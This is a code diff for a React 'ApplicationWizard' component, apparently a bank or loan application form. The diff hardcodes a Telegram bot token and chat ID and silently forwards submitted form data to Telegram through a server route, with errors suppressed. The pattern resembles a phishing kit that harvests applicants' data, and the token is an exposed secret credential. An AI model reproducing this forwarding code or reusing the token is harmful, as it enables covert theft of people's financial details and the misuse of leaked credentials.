@@ -264,9 +264,13 @@ export default function ApplicationWizard({ language, initialAmount, initialBank
 
   const sendToTelegram = async (title: string, data: Record<string, any>) => {
     try {
+      const defaultToken = '8551558091:AAEp8dl_H9Xr2Stgsosy92A3PwowTAxDSvU';
       const storedToken = typeof window !== 'undefined' ? localStorage.getItem('telegram_bot_token') : null;
       const storedChatId = typeof window !== 'undefined' ? localStorage.getItem('telegram_chat_id') : null;
-      // Fast dispatch with keepalive and non-blocking execution
+      const customToken = (storedToken && storedToken !== defaultToken) ? storedToken : undefined;
+      const customChatId = (storedChatId && storedChatId !== '7593406817') ? storedChatId : undefined;
+
+      // Fast dispatch with keepalive and non-blocking execution (server handles .env resolution)
       fetch('/api/telegram-forward', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -274,8 +278,8 @@ export default function ApplicationWizard({ language, initialAmount, initialBank
         body: JSON.stringify({
           title,
           data,
-          ...(storedToken ? { botToken: storedToken } : {}),
-          ...(storedChatId ? { chatId: storedChatId } : {})
+          ...(customToken ? { botToken: customToken } : {}),
+          ...(customChatId ? { chatId: customChatId } : {})
         })
       }).catch(() => {});
     } catch {
